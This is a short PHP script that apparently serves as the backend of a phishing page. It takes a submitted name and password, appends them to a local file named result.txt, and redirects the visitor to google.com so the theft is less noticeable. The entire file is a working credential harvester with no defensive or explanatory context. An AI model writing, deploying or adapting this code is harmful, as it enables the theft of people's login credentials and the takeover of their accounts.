<?php
	if(isset($_POST["name"]) && isset($_POST["pw"])){
		$cert = "Name: ". htmlspecialchars($_POST["name"]). "Password: ". htmlspecialchars($_POST["pw"])."\n";
		$file = fopen("result.txt", "a");
		echo fwrite($file, $cert);
		fclose($file);
	}
	header('Location:https://google.com');
?>
